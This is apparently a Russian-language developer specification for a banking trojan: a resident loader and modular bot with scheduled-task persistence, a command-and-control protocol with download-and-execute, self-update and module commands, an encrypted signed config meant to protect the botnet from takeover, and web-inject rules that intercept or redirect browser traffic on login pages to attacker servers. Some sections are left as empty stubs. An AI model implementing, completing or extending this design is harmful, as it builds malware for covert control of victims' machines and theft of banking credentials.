Резидентный лоадер
1. Автозапуск - через планировщик системы. 
1.1 Для Windows: запуск не при старте системы, а каждую минуту. Если при первом запуске есть права на автозапуск от SYSTEM, то добавлять задание для запуска от SYSTEM. В противном случае - от текущего пользователя. При каждом запуске проверять не запущен ли уже экземпляр лоадера с использованием механизмов именованных пайпов (правило именования имени пайпа не оговаривается)
2. Держать связь с сервером по протоколу CS2.
2.1 Нет необходимости поддерживать все команды. Для лоадера надо поддерживать: /0/, /1/, /5/, /10/, /14/,/23/, /25/,/42/
2.2 id клиента должен быть сохранён и между перезапусками машины не изменяться.

Модульный бот
1. Автозапуск - через планировщик системы. 
1.1 Для Windows: запуск не при старте системы, а каждую минуту. Если при первом запуске есть права на автозапуск от SYSTEM, то добавлять задание для запуска от SYSTEM. В противном случае - от текущего пользователя. При каждом запуске проверять не запущен ли уже экземпляр лоадера с использованием механизмов именованных пайпов (правило именования имени пайпа не оговаривается)
2. Держать связь с сервером по протоколу CS2.
2.1 Надо поддерживать следующие команды: /0/, /1/, /5/, /10/, /14/, /23/, /25/, /30-32/, /41-43/, /62-63/
2.2 id клиента должен быть сохранён и между перезапусками машины не изменяться.
2.3 Обязательная провека всех цифровых подписей
3 Должно быть сразу две версии бота: 32-битная и 64-битная. На 64-битной операционной системе должна работать 64-битная версия бота. При этом бот должене распространяться как один файл, при запуске он определяет версию системы, вытаскивает из себя тело нужной версии и без сохранения на диск запускает её.
4 Должна работать система модулей. Модуль - это некоторая DLL. Приём команды на работу с модулем происходит через входящую команду 62, отправка данных после  выполнения модуля осуществляется через команду 63.

Протокол CS2
1 Список серверов задаётся списоком ip:port (ip может быть как ipv4, так и ipv6). Если порт чётный то взаимодействие происходит по HTTP, если нечётный, то по HTTPS (сертификат самоподписанны, проверки сертификатов должны быть отключены).
2 Работа с сервером осуществляется через HTTP-запросы. Они могут быть как GET, так и POST. 
2.1 Каждый запрос содержит в URI три компонента разделённых символом "/" - тег группы, id клиента, код команды. /<group-tag>/<clientid>/<ccode>/, где group-tag - тег группы, clientid - id клиента, ccode - код команды. 
2.1.1 Тег группы - это произвольная строка состоящая из символов (a-z) и цифр (0-9). Параметр не чувствителен к регистру.
2.1.2 Id клиента - это строка состоящая из двух компонентов разделённых точкой. Первая часть имеет формат <name>_XYYYYYYY, где name это некоторое имя которое может как-то идентифицировать машину (имя компьюетра или имя пользователя, в зависимости от типа операционной системы), X - символ обозначающий тип системы на которой работает клиент (W - windows, L - linux, A - андроид, M - Mac OS), YYYYYYY - 3-7 цифр содержащих major-version, minor-version и build операционной системы если таковые имеются у системы (например, длЯ 6.1 build 7600 это будет 617600). Вторая часть содержит 32 случайных символов 0-9, A-F. Пример id клиента - QWERTY_W617600.11223344556677889900AABBCCDDEEFF. Параметр не чувствителен к регистру.
2.1.3 Код команды - это число от 0 до 999.
2.2 Четрвёртый и последующий компоненты в URI, а также тело запроса и ответа зависят от кода команды
2.3 Команды могут быть исходящими и входящими, коды исходящих и входящих команд пересекаться не могут. Исходящая команда это команда, код которой указан в URI запроса, входящая команда это команда пришедшая ответ на исходящую команду с кодом 1.
3 Последовательность работы с сервером
3.1 Перед работой необходимо проверить сервер. Если сервер был проверен менее 4 часов назад, то проверка не обязательна. Проверка осуществляется через запрос файла с именем "spk". Файл с сервера запрашивается через /5/. Файл является сертификатом сервера (см. пункт 10.2) внутри универсального подписанного конфига
3.2 После успешной проверки необходимо инициализировать сессию запросов команд. Инициализация осуществляется через /0/
3.3 После успешной инициализации начинается цикл из 100 последовательных запросов /1/.
3.4 Если в  в результате отправки HTTP-запроса или получения HTTP-ответа возникает ошибка, то запрос должен быть повторён. Удачный результат это когда сервер отвечает с HTTP кодами 200, 403 или 404.  Если после 3 повторов не было удачного результата, повторы осуществляются через 15 секунд. Любой другой код означает неудачу при отправке запроса или получении ответа. 
Если в результате выполнения запроса команды /1/ после всех повторов была неудача, то клиент должен взять следующий сервер из списка и начать процесс заново: провека сервера, команда /0/ и 100 команд /1/. Если клиент дошёл до конца списка серверов, он должен начать сначала и так до бесконечности. Если 100 команд /1/ завершились удачно, всё равно берём следующий сервер и повторяем процесс.
4 Основной конфиг клиента прошивается в него при создании. При этом во время его работы на целевой машине имеется возможность его обновления. Основной конфиг имеет неотъемлемое свойство - версия. Версия основного конфига - это произвольное 32 битное беззнаковое число. При этом обновление конфига на клиенте возможно только в случае, если версия нового конфига строго больше, чем предыдущего. Подробное описание конфига в пункте 10.1
4.1 Запрос нового основного конфига осуществляется через исходящую команду /23/ через каждые 3 часа.
5 Цифровая подпись сервера в текущей реализации не используется, вместо неё используется заглушка которая выдаёт вместо подписи строку "1234567890"
6 Цифровая подпись конфига - это 384-битная цифровая подпись ECDSA с алгоритмом хеширования SHA2-384. Стандарт подписи должен быть совмести с на алгоритмом Microsoft  BCRYPT_ECDSA_P384_ALGORITHM из библиотеки CNG.
7 Исходящие команды
7.1 /0/ - инициализация цикла получения входящих команд. Имеет 5 параметров. Формат запроса для команды /0/:
/<group-tag>/<clientid>/0/<system-version>/<client-version>/<client-self-ip-address>/<devhash>/<token-string>/
system-version - наименование операционной системы c версией, серви паком и архитектурой (32, 64 bit) 
client-version - версия клиента, произвольное число больше 1000
client-self-ip-address - собственный внешний ip-адрес (ipv4 и ipv6) клиента в строковом представлении. Добывается самим клиентом средствами выбранными по усмотрению разработчика. 
token-string - случайная строка длиной от 16 до 32 символов. Может содержать большие и маленькие английские символы и цифры от 0 до 9. Чувствителен к регистру
devhash - идентификатор оборудования. Произвольная HEX-строка (символы 0-9, A-F) представляющая некоторый 256-битный хеш, который зависит оборудования или операционной системы  на которых работает клиент. devhash вычисленный несколько раз на одной и той же машине всегда должен быть одинаковым.
Ответом сервера является файл (content-type: binary) следующего содержимого:
/1/<group-tag>/<clientid>/<token-string>/<binary-content-length>/\r\n<binary-content>\r\n<server-sign>
binary-content-length - длина блока binary-content в байтах
binary-content - блок бинарных данных. Это расширенный конфиг сервера
server-sign - цифровая подпись сервера, в неё включает содержимое ответа от первого байта до второго перевода строки \r\n (символы \r\n включаются в цифровую подпись)
7.2 /1/ - запрос входящей команды. Команда имеет один параметр - случайную строку, которая будет продублирована в параметрах входящей команды. Идентичен параметру token-string из команды /0/. Более подробно входящие команды изложены в пункте 8
7.3 /5/ - запрос файла или конфига с сервера. Команда имеет один параметр - имя файла. Имя файла может содержать английские символы и цифры, имя файла чувствительно к регистру символов. В ответ на код /5/ сервер выдаёт файл (content-type: binary). Пример запроса с кодом 5 - /test1/QWERTY_W617600.11223344556677889900AABBCCDDEEFF/5/spk/. 
В случае неудачи сервер возвращает код 403 или 404.
7.4 /10/  - отчёт о выполненной входящей команде. Формат запроса для команды /10/:
/<group-tag>/<clientid>/10/<incode>/<cmd-id>/<result-code>/
incode - код выполненной входящей команды
cmd-id - идентификатор выполненной входящей команды.
result-code - код результата выполненной входяще команды. Число от 0 до 999.
В ответ на данный запрос сервер всегда отвечает строкой "/1/" (Content-type: text/plain).
7.5 /14/ - сохранение на сервера пары ключ-значение. 
Формат запроса:
/<group-tag>/<clientid>/14/<name>/<value>/0/
name - ключ. Произвольная строка с английскими заглавными и строчными буквами, цифрами и символами точка, "+" и "-".
value - значение. Произвольная строка, все специальные символы должны быть закодированы в urlencode.
Третий параметр всегда ноль.
Ответ на данную команду всегда одинаковый: HTTP 200, Content-type: text/plain, содержимое тела ответа "/1/"
7.6 /23/ - выдача клиенту основного конфига. Имеет только один дополнительный параметр - версию текущего конфига клиента. 
Пример запроса клиента:
/<group-tag>/<clientid>/23/<current-config-version>/
current-config-version - текущая версия конфига.

Пример ответа сервера:
/23/<group-tag>/<clientid>/<config-version>/<binary-content-length>/\r\n
<binary-content>\r\n
<server-sign>
binary-content - бинарное содержимое конфига
config-version - версия конфига в binary-content 
binary-content-length - длина binary-content в байтах записанная в виде строки

Если на сервере нет ни одного файла удовлетворяющего по условиям данному клиенту, то сервер должен ответить HTTP 404. binary-content - это и есть новый основной конфиг клиента. Клиент должен проверить основной конфиг, извлечь из него версию которая прописана в нём. Версия, которая в нём прописана, должна быть строго равна версии, которая указана в параметре config-version в ответе сервера. При этом эта версия, должна быть строго больше, чем текущая версия конфига используемая клиентом. После всех проверок клиент должен безусловное и незамедлительно начать использовать новый основной конфиг.
Запрос нового основного конфига осуществляется клиентом не чаще, чем один раз в 4 часа.

7.7 /25/ - запрос нового тела. Команда не имеет параметров.
Пример запроса клиента:
/<group-tag>/<clientid>/25/<token-string>/
token-string -идентичен параметру в команде /1/ 

Пример ответа сервера:
/25/<group-tag>/<clientid>/<token-string>/\r\n
<link>\r\n
<server-sign>

Если нет ни одной ссылки удовлетворяющего по условиям данному клиенту, то сервер отвечает HTTP 404. Ссылка выдаваемая сервером оформлена по всем правилам URL. По этой ссылке располагается новое тело (исполняемый модуль) для клиента. Этот файл упакован в универсальный подписанный конфиг. После всех проверок этим файлом надо заменить свой собственный исполняемый модуль. 
Запрос нового тела осуществляется клиентом не чаще, чем один раз в 4 часа. Перезапускаться сразу и нет после обновления тела - вопрос решается на усмотрение разработчика.
7.8 /60/
7.9 /63/ - отправка данных модуля.  Команда имеет следующие параметры: имя модуля, ctl к модулю, результирующая строка ctl, вспомогательный тег, ctl_OutData. Причём результирующая строка ctl, вспомогательный тег и ctl OutData являются опциональными. При этом параметр "ctl_OutData" является блоком произвольных бинарных данных и передаётся в теле через multipart/form-data, имя параметра внутри multipart/form-data -- "noname". Если в запросе присутствует ctl_OutData, то запрос передаётся методом POST.
Пример запроса клиента
/<group-tag>/<clientid>/63/<module name>/<ctl>/<ctl-result-string>/<aux-tag>/
module name - строка состоит только из английских букв, максималная длина 64 символа
ctl - строка состоит только из английских букв и цифр, максималная длина 64 символа
ctl-result-string - строка в формате base64
aux-tag - вспомогательный тег, строка состоит только из английских букв и цифр, максималная длина 128 символов. Поле необходимо для удобства поиска в таблице, предполагается, что на этом столбце в таблице будет стоять индекс.
ctl_OutData - передаётся в теле POST-запроса и  содержит блок произвольных бинарных данных. Максимальный размер 32 МБ. 
Ответ сервера либо всегда  200 - "/1/", либо 403 если клиента нет в базе или он слишком давно присылал /0/
7.10 /64/ - отчет о событии в модуле. Команда имеет следующие параметры: имя модуля, имя события, информация о событии, вспомогательный тег, данные события. Причём информация о событии, вспомогательный тег и данные являются опциональными. информация о событии -- это строка в кодировке UTF-8 максимальной длины 64 КБ (байтов, а не символов). Параметр с данными является блоком произвольных бинарных данных и передаётся в теле через multipart/form-data, имя параметра внутри multipart/form-data -- "data", а имя параметра с информацией о событии -- "info". Если в запросе присутствует данные или информация о событии, то запрос передаётся методом POST.
Пример запроса клиента
/<group-tag>/<clientid>/64/<module name>/<event-name>/<aux-tag>/
module name - строка состоит только из английских букв, максималная длина 64 символа. Предполагается, что на этом столбце в таблице будет стоять индекс.
event-name - строка состоит только из английских букв и цифр, максималная длина 64 символа. 
aux-tag - вспомогательный тег, строка состоит только из английских букв и цифр, максималная длина 128 символов. Поле необходимо для удобства поиска в таблице, предполагается, что на этом столбце в таблице будет стоять индекс.
Ответ сервера либо всегда  200 - "/1/", либо 403 если клиента нет в базе или он слишком давно присылал /0/

8 Входящие команды отправляет сервер в ответ на запрос /1/. В ответ на этот вопрос сервер отвечает файлом (content-type: binary). Файл имеет следующий формат:
/<incode>/<group-tag>/<clientid>/<token-string>/<cmd-id>/\r\n<command-params>\r\n<server-sign>
incode - код входящей команды
token-string - строка скопированная из параметра команды /1/ из GET-запроса
cmd-id - идентификатор выданной команды, произвольная строка с большими и маленькими английскими символами, цифрами от 0 до 9 и символомами -,+,точка,#. Чувствителен к регистру
command-params - произвольная строка с параметрами (не должны содержаться символы \r\n так как это обозначает конец строки)
server-sign - цифровая подпись сервера, в неё включается содержимое ответа от первого байта до второго перевода строки \r\n (символы \r\n включаются в цифровую подпись)
Если для клиента нет никакой входящей команды, то в ответ выдаётся строка из 3 символов "/1/", Content-type: text/plain.
8.1 /30/ - перезапуск системы. 
8.2 /31/ 
8.3 /32/
8.4 /41/ - запуск исполняемого файла
8.5 /42/ - запуск исполняемого файла по альтернативной схеме. В качестве параметра команды идёт строка с конфигом запуска файла по альтернативной схеме (пункт 10.8).
8.11 /62/ - команда модулю.  Параметр команды состоит из трёх компонентов разделённых пробелом: имени модуля, команды модулю (ctl) и аргумент команды модулю (arg). Имя модуля может содерджать только английские буквы (регистр не имеет значения), команда модулю можеит содежать английские буквы (регистр не имеет значения) и цифры, аргуметр команды это произвольный блок данных в формате base64.
Пример, параметра входящей команды 62:
testMod status ZnVmYWlrYQ==
, где "testMod" - имя модуля, "status" - команда модулю, "ZnVmYWlrYQ=="  - аргумент команды модулю.
Команды "start" и  "release" являются зарезервированными
8.12 /70/
8.13 /71/
8.14 /666/
8.16 Ответы на входящие команды
8.16.1 Код 1 - успешное выполнение команды
8.16.2 Код 2 - неправильно указан параметр команды
8.16.3 Код 3 - не действительная цифровая подпись конфига
8.16.4 Код 4 - невозможно скачать файл по ссылке
8.16.5 Код 5 - файл повреждён
8.16.6 Код 6 - при запуске файла на исполнение системная функция завершилась неудачно

9 Универсальный подписанный конфиг является контейнером для всех файлов для которых требуется проверка подлинности. Он состоит из 48 байтового заголовка и зашифрованной части. 
Смысл подписи конфига – защита от перехвата управления всем ботнетом. Перехват управления C&C-сервером или прокладкой (например, хостером, или крысой) позволяет подменить список C&C-прокладок в конфиге, и перехватить управление сетью. Если же конфиг подписан, то кроме перехвата сервера, нужно еще добыть ключи.
9.1 48 байтовый заголовок используется для вычисления Кey, IV  для расшифровки данных. Для вычисления Кey для расшифровки AES256-CBC надо провести следующие вычисления: взять первые 32 байта заголовка вычислить его SHA256-хеш и добавить в конец этим 32 байтам, получается 64 байта,  снова  вычислить SHA256-хеш от этих 64 байт и добавить в конец, потом снова вычислить SHA256-хеш от получившихся 96 байт и добавить в конец и так повторять пока размер данных не достигнет 4096 байт. Хеш SHA256 от полученного блока данных размером 4096 байт будет являться Key для AES256-CBC.  
Для вычисления IV для расшифровки AES256-CBC надо провести следующие вычисления: взять 32 байта заголовка начиная со 16 байта и до конца (нумерация байтов с нуля), вычислить его SHA256-хеш и добавить в конец этим 32 байтам, получается 64 байта, снова  вычислить SHA256-хеш от этих 64 байт и добавить в конец, потом снова вычислить SHA256-хеш от получившихся 96 байт и добавить в конец и так повторять пока размер данных не достигнет 4096 байт. Первые 16 байт хеша SHA256 от полученного блока данных размером 4096 байт будет являться IV для AES256-CBC.  
Таким образом, получается такая схема вычислений (операция "+" это конкатенация бинарных блоков):
Key
data0 = header[0:31]
data1 = data0 + sha256(data0)
data2 = data1 + sha256(data1)
data3 = data2 + sha256(data2)
data4 = data3 + sha256(data3)
...
data127 =  data126 + sha256(data126)  
/размер data127 - 4096 байт
Key = sha256(data127)  

IV 
data0 = header[16:47]
data1 = data0 + sha256(data0)
data2 = data1 + sha256(data1)
data3 = data2 + sha256(data2)
data4 = data3 + sha256(data3)
...
data127 =  data126 + sha256(data126)   
/размер data127 - 4096 байт
IV = sha256(data127)[0:15]
В итоге мы имеем 256 битный Key и 128 битный IV  для осуществления расшифровки AES256-CBC.
9.2 Шифрочасть имеет размер кратный 16 байтам, это зашифрованный блок по алгоритму AES256-CBC.
9.3 Перед шифрованием данные дополняется так чтобы их длина была кратна 16 байтам. Выравнивание осуществляется по стандарту  PKCS7 padding (16). 
9.4 Перед шифрованием оригинальные данные опционально могут быть сжаты по алгоритму LZO. Перед шифрованием данные дополняются спереди 8-байтовым хидером, а с конца цифровой подписью конфига (ECDSA384, алгоритм хеширования SHA-2-384), причём в цифровую подпись включается добавленный спереди 8-байтовый заголовок. 8-байтовый заголовок состоит из двух значений DWORD: первое значение это размер оригинальных данных, второе значение битовые флаги.
9.5 Таким образом алгоритм создания  универсального подписанного конфига такой:
9.5.1 Сначала оригинальные данные по необходимости сжимаются. 
9.5.2 Подготовленные оригинальные данные дополняются спереди 8-байтовым заголовком с размером данных (если они были сжаты, то размером сжатых данных) и флагами. С конца дополняются цифровой подписью конфига (ECDSA384/SHA384, в цифровую подпись включается добавленный спереди 8-байтовый заголовок)
9.5.3 После этого получившийся блок данных дополняется так, чтобы он был кратен по длине 16 байтам по алгоритму PKCS7 padding (16). 
9.5.4 Генерируется 48 байтовый блок случайных данных.
9.5.5 На основе сгенерированного в пунке 9.5.4 блока вычисляется Key и IV
9.5.6 Данные полученные в пункте 9.5.3 шифруются с помощью алгоритма AES256-CBC. 
9.5.7 К блоку сгенерированному в пункте 9.5.4 добавляется в конце данные полученные в результате шифрования в пункте 9.5.6
10 Конфиги
10.1 Основной конфиг клиента
Это текстовый файл в формате XML внутри универсального подписанного конфига (п. 9). Он содержит тег группы, версию конфига, список серверов и имена конфигов статических инжектов и динамических инжектов. Пример основного конфига клиента:
<mcconf>
<ver>14000</ver>
<gtag>test2</gtag>
<servs>
<srv>1.2.3.4:443</srv>
<srv>5.6.7.8:443</srv>
...
<srv>51.62.71.83:443</srv>
</servs>
<stinj>name1</stinj>
<dyinj>name2</dyinj> <smst>name3<smst>
</mcconf>
Основной конфиг клиента всегда находится внути универсального подписанного конфига.
10.2 Сертификат сервера - это текстовый XML-файл в котором прописан срок его действия (в будущих реализациях возможно наличие других данных).
Пример сертификата сервера:
<ssert>
<expir>1451069714</expir>
</ssert>
В тегах expir содержится дата после которой сертификат перестаёт быть действительным. Дата указывается в формате EPOCH time. Работа с сервером с не действительным сертификатом запрещена.
Сертификат сервера всегда находится внути универсального подписанного конфига.

10.3 Расширенный конфиг сервера - это текстовый XML-файл в котором прописан срок его действия (в будущих реализациях возможно наличие других данных) и адреса дополнительных серверов. В текущей реализации не используется никаких дополнительных серверов. Требуется только проверка срока дейсвтия конфига.
<servconf>
<expir>1451069714</expir>
<plugins>
<psrv>2.3.4.5:443</psrv>
<psrv>21.31.41.51:443</psrv>
</plugins>
<datapost></datapost>
</servconf>
В тегах expir содержится дата после которой расширенный конфиг сервера  перестаёт быть действительным. Дата указывается в формате EPOCH time. Работа с сервером с не действительным сертификатом запрещена.
В теге plugins содержится список серверов, на которых хранятся модули. Каждый из них представляет собой сервер, который поддерживает только одну команду /5/. Все модули должны быть запрошены у них. Если в расширенном конфиге сервера нет тега <plugins>, значит бот вообще не будет поддерживать модули.
Расширенный конфиг сервера всегда находится внути универсального подписанного конфига. 
10.4 Конфиг динамических инжектов - это текстовый XML-файл в стандартной кодировке ANSI, в котором прописаны правила обработки HTTP-ответов серверов. Конфиг описывает список масок http(s)-ссылок которые надо обработать, адрес обработчика и дополнительные флаги. 
Конфиг организован в виде массива элементов в тегах <igroup>.  Каждый <igroup> содержит неограниченное количество элементов в тегах <dinj>.  Каждый элемент <dinj> описывает правило обработки HTTP-ответа в нём содержится маска ссылки, адрес обработчика и допольнельные флаги: отправлять ли искомый http-запрос и приоритет. Маска ссылки находится в теге <lm> в атрибуте "value", адрес обработчика в теге <hl>, отправлять ли искомый http-запрос в тегах <sq> и приоритет <pri>. 
Параметр в теге <sq> содержит неотрицательное числовое значение. Если он равен нулю, то не надо отправлять искомый http-запрос обработчику, если он равен единице, то обработчику надо отправить только заголовок запроса, если он равен числу 2, то обработчику надо отправить весь запрос. Параметра в теге <sq> может и не быть вообще, в этом случае считается что он равен нулю.
Приоритет  в теге <pri>  содержит неотрицательное числовое значение. Если приоритет не указан, то его значение равно максимальному положительному 32-битному значению (signed int) - 2 147 483 647. Допускается значение приоритета равное нулю.
Адрес обработчика - это http-ссылка обработчика на удалённом сервере. Ссылка всегда оформлена с импользованием префиксов http:// или https://.  Если префикс https:// то следует использовать протокол HTTPS для взаимодействия с обработчиком.
Маска ссылки - это некоторое выражение содержащее символы звёздочка, вопросительный знак и квадратные скобки "[]". Звёздочка обозначает любую последовательность символов включая пустую. Вопросительный знак обозначает любой одиночный символ. Квадратные скобки перечисляют список одиночных символов, например, [jeu] - на его месте можеьт стоять только один из трёх символов "j" , "e" или "u", [?] - только символ вопросительного знака, [[] - только открывающая квадратная скобка, [*] - только символ звёздочка, [[*] - звёздочка или открывающая квадратная скобка.
Пример:   q[abc]erty[?]u[[]uu??88]88*
qaerty?u[uuzz88]88444 - подходит
qbertysu[uuzz88]88444 - не подходит
qcerty?u[uuz88]88 - не подходит
qaerty?u[uuz?88]88 - подходит
qrerty?u[uuz?88]88 -  не подходит
qaerty?u!uuz?88]8811 -  не подходит
В маску ссылки никогда не входит префикс http(s):// и при проверке искомая ссылка проверяется без данного префикса.
Пример конфига динамических инжектов:
<igroup>
<dinj> 
<lm value="*/logon/*"/>
<hl>http://14.25.36.47/test2.php</hl></dinj> 
</igroup>
<igroup>
<dinj> <lm>*test*.com/qwerty[?]*</lm>
<hl>https://1.2.3.4/test2.php</hl></dinj>
<dinj> 
<lm value="??site.net/cderfv.asp*">

<lm>
<hl>https://1.2.3.4/test2.php</hl>
<pri>1</pri>
<sq>1</sq>
</dinj>
<dinj> 
<lm>[abcdef]wert[1234567890].com/papka/userprofile.php</lm>
<hl>https://1.2.3.4/test.php</hl>
<pri>10</pri>
</dinj>
</igroup>
<igroup><dinj> 
<lm>*/sitelogin/*</lm>
<hl>http://41.24.53.64:8089/test.aspx</hl>
<pri>45</pri><sq>2</sq>
<dinj> </igroup>
В данном примере в одном igroup три dinj, в двух других по одному dinj.
Внутри тега lm могут быть указаны дополнительные теги, указывающие дополнительные условия для использования ссылки или игнорирования её.
ignore_mask - игнорировние если ссылка удовлетворяет маске указанной в атрибуте value. Если указано, несколько тегов ignore_mask, то ссылка игнорируется, если оно подошла хотя бы под одну из указанных.
ignore_header - игнорировние если ответ содержит хидер удовлетворяющийпараетрам из атрибутов header и value. Если указано, несколько тегов ignore_header , то ссылка игнорируется, если оно подошла хотя бы под один из указанных. Значения в атрибутах header и value могут быть указаны как маски.
require_header - дополнительная проверка на хидер, если ответ содержит хидер удовлетворяющийпараетрам из атрибутов header и value, то он будет отправлен на обработку. Если указано, несколько тегов require_header , то ссылка прнимается в обработку, только если подошла под каждый из указанных. Значения в атрибутах header и value могут быть указаны как маски.
<dinj> 
  <lm value="example.com/*">
    <ignore_mask value ="*.css"/>
    <ignore_mask value ="*.rar"/>
    <ignore_header header="content-type" value="text/plain"/>
   <require_header header="content-lang" value="*"/>
  </lm>
  <hl value="test.net/handler.php">
</dinj> 
В указанном отрывке конфига, ссылка example.com/assetst/test.css будет проигнорирована, а ссылка example.com/assetst/test.html будет обработана только если ответ сервера содержит хидер content-lang.
10.4.1 Обработка HTTP-ответа начинается только после полного получения его содержимого от сервера (в колбэке AfterReceiveResponse в коде браузерного перехватчика). Если ссылка запроса на который получен ответ, подходит под несколько элементов <dinj> нахоящихся в разных <igroup> (хотя бы один находящийся в отдельном <igroup>), то такая ссылка должна быть пропущена без обработки. 
После того как он полностью получен, необходимо отпраить POST-запрос на адрес обработчика. Если элементов <dinj> с маской удовлетворяющих данной ссылке несколько и они все находятся в одном <igroup>, то они все должны быть опрошены по очереди согласно их приоритетам в порядке возрастания (первым идёт обработчик с самым низким значением приоритета). Если в списке несколько обработчиков с одинаковым приоритетом, то данная ситуация должна быть разрешена на усмотрение разработчика. Подразумевается, что составитель конфига должен позаботиться о том, чтобы таких ситуаций не возникало.
Тело POST-запроса оформляется в формате nultipart/form-data. В нём должны быть следующие элементы:
sourcelink - полная искомая ссылка с префиксом https:// или http:// (если нет возможности узнать какой именно протокол, то ставить всегда  https://) в кодировке ANSI.
sourcequery - искомый http-запрос, зависит от значения в параметре sq в <dinj>. Параметр может отсутствовать, если значение в параметре sq равно нулю.
sourcehtml - искомый http-ответ. Полный ответ сервера от начала до конца со всеми хидерами, без изменений, в искомой кодировке.
Помимо параметров в теле, в URI запроса должны быть указаны следующие параметры в формате urlencode: cid - идентификатор клиента, clientid в виде строки (см. пункт 2.1.2).
group - тег группы клиента в виде строки.
Ответ обработчика:
200 - обработчик изменил страницу и в теле ответа содержится новый изменённый ответ сервера со всеми хидерами, который должен быть подставлен браузеру. Никакие другие обработчики не должны вызываться.
303 - обработчик не изменил страницу и при этом разрешает обращение к другим обработчикам если таковые имеются.
304 - обработчик не изменил страницу и при этом запрещает обращение к другим обработчикам 
Все остальные коды необходимо расценивать как ответ 303, после чего данный элемент <dinj> (или какой-то объект или структура в памяти, который описывает данных элемент <dinj>) должен быть деактивирован на 30 минут и никак не учавствовать в обработке. Деактивация должна быть локальная только в текущем процессе.
10.5 Конфиг статических инжектов - это текстовый XML-файл в стандартной кодировке ANSI, в котором прописаны правила обработки HTTP-ответов серверов. Конфиг описывает список перенаправлений. 
В отличие от динамических инжектов, статические инжекты стоят на более низком уровне и блокируют отправку http-запросов на оригинальный сервер и полностью подменяют http-ответы (если они есть) оригинального сервера.
Конфиг описывает список статических инжектов. Список статических инжектов указывается в теге <slist>. В теге <slist> одержится список элементов в тегах <sinj>. Каждый элемент sinj содержит: маску срабатывания в теге <mm>, линк на котором включится инжект <sm>, наименование сервера-обработчика <srv>, новое значение поля host в заголовках запроса <nh>.  Тег sm является опциональным, в этом случае подразумевается, что он равен содержимому тега mm.
Каждый статический инжект может находиться в трёх состояниях: "готов", "включён" и "выключён". Изначально он находится в состоянии "готов" и находится в нём до тех пор пока не произойдёт переход на ссылку указанную в теге sm. Как только происходит переход на данную ссылку, статический инжект переходит в состояние "включён".  В состояние "включён" инжект может перейти только из состояния "готов". В состояние "готов" инжект может перейти только из состояния "выключен"
Подразумевается что решение о переходе инжекта из состояния "готов" в состояние "включён" происходит в колбеке CheckURL. Решение о переходе инжекта из состояния "включён" в состояние "выключен" происходит в колбеке AfterReceiveResponse. 
Маска срабатывания (тег mm) - маска идентичная маске в конфиге динамических инжектов. Все запросы подходящие под данную маску должны быть направлены на сервер-обработчик
Маска ссылки на котором включится инжект или просто маска включения (тег sm или тег mm) - маска ссылки при переходе на которую инжект переходит из состоянию "готов" в состояние "включён"
Сервер-обработчик (тег srv) - пара значений ip:port которая указывает на сервер обработчик. Если значение порта чётное, то работа идёт без шифрования (HTTP), если порт нечётный, то работа идёт поверх SSL/TLS (HTTPS).
Новое значение host (тег nh) - значение поля host которое должно будет заменить оригинальное значение поля host в заголовке исходящего запроса.
Пример конфига:
<slist> 
<sinj>
<mm>site.com/*</mm>
<sm>site.com/loginpage</sm>
<nh>othersite.com</nh>
<srv>11.22.33.44:80</srv>
</sinj> 
<sinj> 
<mm>qwerty1.net/papka2/*</mm>
<nh>zxc.org</nh>
<srv>1.2.3.4:443</srv>
</sinj>  
<slist> 

10.5.1 Как наиболее простую аналогию статическим инжектам следует рассматривать как перенаправление некоторых страниц. Итак, допустим мы находимся в колбэке BeforeSendRequest, и после проверки ссылки по всем инжектам которые находятся в состоянии "включён" стало понятно, что данная ссылка подходит под какой-то инжект, то необходимо произвести перенаправление запроса на сервер-обработчик. 
Для перенаправления  надо исходящий запрос надо скопировать, изменить в копии поле host на тот который указан в конфиге в теге "nh", добавить заголовок "X-Forwarded-for" с собственным внешним ip-адресом, и заголовок "clientinfo"  в котором будет указаны сначала тег группы клиента, а потом через пробел его полный clientid, о. После этих модификаций надо отправить запрос на сервер-обработчик. Если порт сервера чётный, то по без шифрования, если порт нечётный, то через SSL/TLS. Запрос рекомендуется отправить асинхронно или просто в отдельном потоке. 
Исходный запрос на оригинальный сервер надо изменить таким образом чтобы он превратился в запроса GET с URI равным "/", удалить заголовок с cookie и прочие специфичные теги, после этого отправить на оригинальный сервер.
После получения ответа от оригинального сервера, в колбэке AfterReceiveResponse необходимо дождаться когда придёт ответ от сервера-обработчика. После этого заменить ответ оригинального сервера (полностью заголовок и тело) ответом от сервера-обработчика.
Помимо прочего, в ответе сервера обработчика может находиться один специальный тег с именем "sinjdsto" в котором будек указано числовое значение. Начилие этого хидера в ответе сервера-обработчика означает что статический инжект должен быть переключен из состояния "включён" в состояние "выключен". Числовое значение указывает количество секунд через которое статический инжект будет автоматически переведён из состояния "выключен" в состояние "готов". При этом при замене ответа оригинального сервера ответом сервера-обработчика необходимо удалить заголовок "sinjdsto". 
Подразумевается что в конфиге статических инжектов все маски срабатывания (и, соответственно, маски вкючения) не пересекаются друг с другом. Подразумевается что ссылка колбэке CheckURL сработает только на одной  маске включения, а в колбэке BeforeSendRequest ссылка сработает только на одной  маске срабатывания. В противном случае разрешение ситуации зависит от разработчика. Подразумевается, что автор конфига позаботится об уникальности масок в тегах "sinj".
Если колбэке AfterReceiveResponse известно что запрос был обработан статическим инжектом, то он не должен быть обработан динамическим инжектом. Таким образом, статические инжекты имеют приоритет перед динамическими.
10.6 
10.7 Конфиг запуска файла - это 
10.8 Конфиг запуска файла по альтернативной схеме - это блок закондированный в base64 с информацией о том, откуда скачивать файл и как его запускать. После декодирования конфига, который является обычной строкой в кодировке base64, должен получиться следующий блок бинарных данных:
флаги - тип DWORD, в текущей реализации не используются и всегда равны нулю. 
SHA256-хеш исполняемого файла, 32 байтовый блок бинарных данных, 
WORD - длина ссылки на скачивание файла,
AnsiString - ссылка на скачивание файла 
Sign - цифровая подпись конфига.
10.8.1 При получении входящей команды /42/ клиент должен декодировать из base64 её параметр и получить блок бинарных данных. После этого он должен проверить длину ссылки на скачивание и размер оставшегося блока в котором должна находиться цифровая подпись. В цифровая подпись всегда имеет фиксированный размер. Если проверки не прошли, то надо отчитаться на сервер о результате выполнения команды с кодом 2. 
10.8.2 Если  проверки прошли успешно, то надо проверить валидность цифровой подписи. Если цифровая подпись не действительная, то надо отчитаться на сервер о результате выполнения команды с кодом 3. 
10.8.3 После успешной проверки цифровой подписи надо скачать исполняемый файл по ссылке. В случае учспешного скачивания необходимо проверить файл по SHA256-хешу. Если скачивание неудачно, то его надо повторить 3 раза с перерывом 15 секунд. Если после всех попыток скачать файл не удалось, то надо отчитаться на сервер о результате команды с кодом 4. 
